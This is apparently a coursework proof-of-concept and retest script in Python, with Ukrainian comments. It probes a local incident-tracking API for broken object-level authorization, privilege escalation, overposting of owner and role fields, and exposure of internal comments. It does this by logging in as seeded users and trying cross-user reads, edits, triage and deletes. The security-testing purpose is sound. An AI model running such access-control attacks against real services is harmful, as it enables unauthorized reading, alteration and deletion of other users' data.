"""Локальний PoC/retest для ЛР 4: IDOR/BOLA, вертикальне підвищення, child, A-11.
Пароль береться зі змінної SeedUsers__Password; cookie зберігаються лише в пам'яті; значення не друкуються.
Запуск: py -3 scripts/lr04/lab04_poc.py [--base http://localhost:5080]"""
import argparse, http.cookiejar, json, os, sys, urllib.error, urllib.request, uuid

sys.stdout.reconfigure(encoding="utf-8")

IDS = {
    "alice_incident": "20000000-0000-0000-0000-000000000001",
    "bob_incident": "20000000-0000-0000-0000-000000000002",
    "comment_alice_public": "30000000-0000-0000-0000-000000000001",
    "comment_bob": "30000000-0000-0000-0000-000000000002",
    "comment_internal": "30000000-0000-0000-0000-000000000003",
    "bob_user": "10000000-0000-0000-0000-000000000002",
}
parser = argparse.ArgumentParser()
parser.add_argument("--base", default="http://localhost:5080")
args = parser.parse_args()
password = os.environ.get("SeedUsers__Password", "")
if not password:
    raise SystemExit("Set SeedUsers__Password in this terminal. No value printed.")


class Client:
    def __init__(self, name=None):
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        if name:
            status, _ = self.call("POST", "/api/auth/login", {"userName": name, "password": password})
            if status != 204:
                raise SystemExit(f"login {name} failed with {status}")

    def call(self, method, path, body=None):
        data = json.dumps(body).encode() if body is not None else None
        req = urllib.request.Request(args.base.rstrip("/") + path, data=data, method=method,
                                     headers={"Content-Type": "application/json", "Accept": "application/json"})
        try:
            with self.opener.open(req, timeout=20) as r:
                raw = r.read()
                return r.status, (json.loads(raw) if raw else None)
        except urllib.error.HTTPError as e:
            raw = e.read()
            try:
                return e.code, (json.loads(raw) if raw else None)
            except ValueError:
                return e.code, None


def title_of(body):
    return (body or {}).get("title") if isinstance(body, dict) else None


def line(step, text):
    print(f"[{step}] {text}")


def new_incident(client, label):
    status, body = client.call("POST", "/api/incidents", {
        "title": f"PoC {label} {uuid.uuid4().hex[:6]}",
        "description": "Навчальний запис для перевірки контролю доступу, довший за сорок символів.",
        "severity": "Low", "occurredAtUtc": "2026-10-30T09:00:00Z"})
    assert status == 201, f"create failed {status}"
    return body["id"], body["title"]


alice, bob, morgan, anon = Client("alice"), Client("bob"), Client("morgan"), Client()
print("# LR04 PoC/retest (cookie і пароль не друкуються)")

# 1. READ: Alice -> Bob (горизонтальне підвищення)
s, b = anon.call("GET", f"/api/incidents/{IDS['alice_incident']}")
line("anon -> details Alice", f"status={s} title={title_of(b)!r}")
s, b = alice.call("GET", f"/api/incidents/{IDS['alice_incident']}")
line("alice -> own details", f"status={s} id={(b or {}).get('id')} owner={(b or {}).get('ownerDisplayName')!r}")
s, b = alice.call("GET", f"/api/incidents/{IDS['bob_incident']}")
line("alice -> BOB details", f"status={s} title={title_of(b)!r} owner={(b or {}).get('ownerDisplayName')!r}")
s2, b2 = alice.call("GET", f"/api/incidents/{uuid.uuid4()}")
line("alice -> unknown id", f"status={s2} title={title_of(b2)!r}")
s, b = morgan.call("GET", f"/api/incidents/{IDS['alice_incident']}")
comments = [c.get("id")[-2:] for c in (b or {}).get("comments", [])] if s == 200 else None
line("morgan(Analyst) -> Alice details", f"status={s} comment_ids_tail={comments}")
s, b = alice.call("GET", f"/api/incidents/{IDS['alice_incident']}")
comments = [c.get("id")[-2:] for c in (b or {}).get("comments", [])] if s == 200 else None
line("alice -> own details comments", f"status={s} comment_ids_tail={comments} (03 = internal)")

# 2. MUTATION: Alice -> Bob resource (update/delete/triage)
bob_id, bob_title = new_incident(bob, "target")
before = bob.call("GET", f"/api/incidents/{bob_id}")[1]
s, _ = alice.call("PUT", f"/api/incidents/{bob_id}", {"title": "HACKED by alice"})
after = bob.call("GET", f"/api/incidents/{bob_id}")[1]
line("alice -> PUT Bob incident", f"status={s} bob_title_before={before['title']!r} after={after['title']!r}")
s, _ = alice.call("POST", f"/api/incidents/{bob_id}/triage")
after = bob.call("GET", f"/api/incidents/{bob_id}")[1]
line("alice(Reporter) -> triage Bob incident", f"status={s} bob_status_before={before['status']} after={after['status']}")
s, _ = alice.call("DELETE", f"/api/incidents/{bob_id}")
s_after, _ = bob.call("GET", f"/api/incidents/{bob_id}")
line("alice -> DELETE Bob incident", f"status={s} bob_read_after_delete={s_after}")

# 3. VERTICAL / overposting на власному ресурсі
own_id, _ = new_incident(alice, "own")
s, _ = alice.call("PUT", f"/api/incidents/{own_id}", {
    "title": "Оновлено власником", "status": "Closed", "ownerUserId": IDS["bob_user"], "role": "Analyst"})
d = alice.call("GET", f"/api/incidents/{own_id}")
dd = d[1] if d[0] == 200 else None
bd = bob.call("GET", f"/api/incidents/{own_id}")
line("alice -> PUT own + forged status/owner/role",
     f"status={s} read_by_alice={d[0]} status_after={(dd or {}).get('status')} owner_after={(dd or {}).get('ownerDisplayName')!r} bob_can_read={bd[0]}")
s, b = alice.call("POST", f"/api/incidents/{own_id}/triage")
line("alice(Reporter) -> triage own", f"status={s} body_status={(b or {}).get('status')}")

# 4. Дозволена привілейована дія Analyst: New -> Triaged
tri_id, _ = new_incident(alice, "triage")
s, b = morgan.call("POST", f"/api/incidents/{tri_id}/triage")
line("morgan(Analyst) -> triage New incident", f"status={s} body_status={(b or {}).get('status')}")
s, b = morgan.call("POST", f"/api/incidents/{tri_id}/triage")
line("morgan(Analyst) -> triage again", f"status={s}")

# 5. Child resource
for label, user, cid in [("alice -> comment of Bob incident (comment-2)", alice, IDS["comment_bob"]),
                         ("alice -> INTERNAL comment on own incident (comment-3)", alice, IDS["comment_internal"]),
                         ("alice -> public comment on own incident (comment-1)", alice, IDS["comment_alice_public"]),
                         ("morgan -> internal comment (comment-3)", morgan, IDS["comment_internal"])]:
    s, b = user.call("GET", f"/api/incident-comments/{cid}")
    line(label, f"status={s} text_present={bool(b and b.get('text'))}")

# 6. List / search / summary (A-11)
s, b = alice.call("GET", "/api/incidents")
tails = sorted(i["id"][-1] for i in b) if s == 200 and isinstance(b, list) else None
line("alice -> list", f"status={s} incident_id_tails={tails}")
s, b = alice.call("GET", "/api/incidents/search?q=O%27Brien")
line("alice -> search q=O'Brien", f"status={s} results={len(b) if isinstance(b, list) else None}")
s, b = alice.call("GET", "/api/incidents/severity-summary")
line("alice -> severity-summary", f"status={s} {({x['severity']: x['count'] for x in b} if s == 200 and isinstance(b, list) else None)}")
s, b = anon.call("GET", "/api/incidents/search?q=O%27Brien")
line("anon -> search q=O'Brien", f"status={s} results={len(b) if isinstance(b, list) else None}")
s, b = morgan.call("GET", "/api/incidents")
line("morgan(Analyst) -> list", f"status={s} count={len(b) if isinstance(b, list) else None}")
